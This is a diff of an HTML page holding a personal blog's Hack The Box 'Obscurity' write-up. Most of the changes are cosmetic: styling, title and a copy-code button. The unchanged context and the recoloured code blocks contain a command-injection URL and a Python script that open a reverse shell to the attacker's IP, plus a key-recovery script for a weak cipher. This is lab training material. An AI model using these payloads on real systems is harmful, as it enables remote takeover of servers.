@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <title>
-        Hackthebox - Obscurity Writeup - A personal cybersecurity blog
+        Hackthebox - Obscurity Writeup - fmash16&#39;s blog
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -21,10 +21,10 @@
     
     <meta name="description" content="Difficulty : easy, topics: python, fuzzing, john, crypto" />
     <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>Hackthebox - Obscurity Writeup - A personal cybersecurity blog</title>
+    <title>Hackthebox - Obscurity Writeup - fmash16&#39;s blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
+    <link rel="stylesheet" href="/css/style.min.bef22498336108fd63d73af3a80f7d93e90f4ab8174c15d0ce0fe149dcf0312b.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="Hackthebox - Obscurity Writeup" />
@@ -470,15 +470,15 @@ exec(info.format(path))
 </code></pre><p>So our web url with payload stands as:
 http://10.10.10.168:8080/';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.15.184&rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&rdquo;,&quot;-i&rdquo;]);&rsquo;</p>
 <p>We can write a python script that performs the request for us:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">requests</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">os</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span>host <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;http://10.10.10.168:8080/&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span>payload <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;</span><span style="color:#f99b15">%27%</span><span style="color:#48b685">0Aimport</span><span style="color:#f99b15">%20s</span><span style="color:#48b685">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span style="color:#f99b15">%28s</span><span style="color:#48b685">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span style="color:#f99b15">%29%</span><span style="color:#48b685">0As.connect</span><span style="color:#f99b15">%28%</span><span style="color:#48b685">28%2210.10.14.234</span><span style="color:#f99b15">%22%</span><span style="color:#48b685">2C1234</span><span style="color:#f99b15">%29%</span><span style="color:#48b685">29%0Aos.dup2</span><span style="color:#f99b15">%28s</span><span style="color:#48b685">.fileno</span><span style="color:#f99b15">%28%</span><span style="color:#48b685">29%2C0</span><span style="color:#f99b15">%29%</span><span style="color:#48b685">0Aos.dup2</span><span style="color:#f99b15">%28s</span><span style="color:#48b685">.fileno</span><span style="color:#f99b15">%28%</span><span style="color:#48b685">29%2C1</span><span style="color:#f99b15">%29%</span><span style="color:#48b685">0Aos.dup2</span><span style="color:#f99b15">%28s</span><span style="color:#48b685">.fileno</span><span style="color:#f99b15">%28%</span><span style="color:#48b685">29%2C2</span><span style="color:#f99b15">%29%</span><span style="color:#48b685">0Ap%3Dsubprocess.call</span><span style="color:#f99b15">%28%</span><span style="color:#48b685">5B%22/bin/bash</span><span style="color:#f99b15">%22%</span><span style="color:#48b685">2C%22-i</span><span style="color:#f99b15">%22%</span><span style="color:#48b685">5D</span><span style="color:#f99b15">%29%</span><span style="color:#48b685">0A%27&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span>requests<span style="color:#5bc4bf">.</span>get(host<span style="color:#5bc4bf">+</span>payload)
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">os</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span>host = <span style="color:#ed9d13">&#34;http://10.10.10.168:8080/&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">6</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">7</span>payload = <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">%27%</span><span style="color:#ed9d13">0Aimport</span><span style="color:#ed9d13">%20s</span><span style="color:#ed9d13">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0As.connect</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">28%2210.10.14.234</span><span style="color:#ed9d13">%22%</span><span style="color:#ed9d13">2C1234</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">29%0Aos.dup2</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">.fileno</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">29%2C0</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0Aos.dup2</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">.fileno</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">29%2C1</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0Aos.dup2</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">.fileno</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">29%2C2</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0Ap%3Dsubprocess.call</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">5B%22/bin/bash</span><span style="color:#ed9d13">%22%</span><span style="color:#ed9d13">2C%22-i</span><span style="color:#ed9d13">%22%</span><span style="color:#ed9d13">5D</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0A%27&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">9</span>requests.get(host+payload)
 </code></pre></div><p>We open a nc listener on port 1337 on our kali and enter the request to get
 a reverse shell</p>
 <p><img src="/img/htb_obscurity/6.png" alt=""></p>
@@ -507,45 +507,45 @@ The contents of the files are:</p>
 use the key to decrypt the passwordreminder.txt using the script
 SuperSecureCrypt.py</p>
 <p>We write a decryptor in python</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#! /usr/bin/env python3</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71"># -*- coding: utf-8 -*-</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#5bc4bf">from</span> <span style="color:#fec418">__future__</span> <span style="color:#5bc4bf">import</span> print_function
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">decrypt</span>(text, key):
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    keylen <span style="color:#5bc4bf">=</span> len(key)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    keyPos <span style="color:#5bc4bf">=</span> <span style="color:#f99b15">0</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    decrypted <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#815ba4">for</span> x <span style="color:#5bc4bf">in</span> text:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>        keyChr <span style="color:#5bc4bf">=</span> key[keyPos]
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        newChr <span style="color:#5bc4bf">=</span> ord(x)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>        newChr <span style="color:#5bc4bf">=</span> chr((newChr <span style="color:#5bc4bf">-</span> ord(keyChr)) <span style="color:#5bc4bf">%</span> <span style="color:#f99b15">255</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>        decrypted <span style="color:#5bc4bf">+=</span> newChr
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>        keyPos <span style="color:#5bc4bf">+=</span> <span style="color:#f99b15">1</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>        keyPos <span style="color:#5bc4bf">=</span> keyPos <span style="color:#5bc4bf">%</span> keylen
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    <span style="color:#815ba4">return</span> decrypted
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>key <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>pos <span style="color:#5bc4bf">=</span> <span style="color:#f99b15">0</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#815ba4">with</span> open(<span style="color:#48b685">&#34;out.txt&#34;</span>, <span style="color:#48b685">&#39;r&#39;</span>, encoding<span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;UTF-8&#39;</span>) <span style="color:#815ba4">as</span> f:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>    data <span style="color:#5bc4bf">=</span> f<span style="color:#5bc4bf">.</span>read()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>    <span style="color:#815ba4">with</span> open(<span style="color:#48b685">&#34;check.txt&#34;</span>, <span style="color:#48b685">&#39;r&#39;</span>, encoding<span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;UTF-8&#39;</span>) <span style="color:#815ba4">as</span> d:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>        ch <span style="color:#5bc4bf">=</span> d<span style="color:#5bc4bf">.</span>read()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>        <span style="color:#815ba4">for</span> x <span style="color:#5bc4bf">in</span> data:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>            <span style="color:#815ba4">for</span> j <span style="color:#5bc4bf">in</span> range(<span style="color:#f99b15">255</span>):
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>                <span style="color:#776e71"># print(pos, end=&#39;&#39;)</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>                <span style="color:#776e71"># print(ch[pos], end=&#39;&#39;)</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>                <span style="color:#815ba4">print</span>(key <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#39;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#39;</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>                newChr <span style="color:#5bc4bf">=</span> ord(x)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>                newChr <span style="color:#5bc4bf">=</span> chr((newChr <span style="color:#5bc4bf">-</span> j) <span style="color:#5bc4bf">%</span> <span style="color:#f99b15">255</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>                <span style="color:#815ba4">if</span> ch[pos] <span style="color:#5bc4bf">==</span> newChr:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>                    key <span style="color:#5bc4bf">+=</span> chr(j)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>                    pos <span style="color:#5bc4bf">=</span> pos <span style="color:#5bc4bf">+</span> <span style="color:#f99b15">1</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>                    <span style="color:#815ba4">break</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span style="color:#815ba4">print</span>(key)
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#999;font-style:italic">#! /usr/bin/env python3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#999;font-style:italic"># -*- coding: utf-8 -*-</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">__future__</span> <span style="color:#6ab825;font-weight:bold">import</span> print_function
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">decrypt</span>(text, key):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>    keylen = <span style="color:#24909d">len</span>(key)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>    keyPos = <span style="color:#3677a9">0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>    decrypted = <span style="color:#ed9d13">&#34;&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>    <span style="color:#6ab825;font-weight:bold">for</span> x <span style="color:#6ab825;font-weight:bold">in</span> text:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>        keyChr = key[keyPos]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>        newChr = <span style="color:#24909d">ord</span>(x)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>        newChr = <span style="color:#24909d">chr</span>((newChr - <span style="color:#24909d">ord</span>(keyChr)) % <span style="color:#3677a9">255</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>        decrypted += newChr
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>        keyPos += <span style="color:#3677a9">1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>        keyPos = keyPos % keylen
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>    <span style="color:#6ab825;font-weight:bold">return</span> decrypted
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>key = <span style="color:#ed9d13">&#39;&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>pos = <span style="color:#3677a9">0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span><span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;out.txt&#34;</span>, <span style="color:#ed9d13">&#39;r&#39;</span>, encoding=<span style="color:#ed9d13">&#39;UTF-8&#39;</span>) <span style="color:#6ab825;font-weight:bold">as</span> f:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>    data = f.read()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;check.txt&#34;</span>, <span style="color:#ed9d13">&#39;r&#39;</span>, encoding=<span style="color:#ed9d13">&#39;UTF-8&#39;</span>) <span style="color:#6ab825;font-weight:bold">as</span> d:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>        ch = d.read()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>        <span style="color:#6ab825;font-weight:bold">for</span> x <span style="color:#6ab825;font-weight:bold">in</span> data:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>            <span style="color:#6ab825;font-weight:bold">for</span> j <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">255</span>):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>                <span style="color:#999;font-style:italic"># print(pos, end=&#39;&#39;)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>                <span style="color:#999;font-style:italic"># print(ch[pos], end=&#39;&#39;)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>                <span style="color:#6ab825;font-weight:bold">print</span>(key + <span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span>                newChr = <span style="color:#24909d">ord</span>(x)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span>                newChr = <span style="color:#24909d">chr</span>((newChr - j) % <span style="color:#3677a9">255</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">34</span>                <span style="color:#6ab825;font-weight:bold">if</span> ch[pos] == newChr:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">35</span>                    key += <span style="color:#24909d">chr</span>(j)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">36</span>                    pos = pos + <span style="color:#3677a9">1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">37</span>                    <span style="color:#6ab825;font-weight:bold">break</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">38</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">39</span><span style="color:#6ab825;font-weight:bold">print</span>(key)
 </code></pre></div><p>Running the script, we find the key:
 <strong>alexandrovich</strong></p>
 <p>Now we decrypt the passwordremider.txt:</p>
@@ -722,6 +722,64 @@ file:</p>
         
         hasInnerContainers: true,
     });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
 </script>
 
 
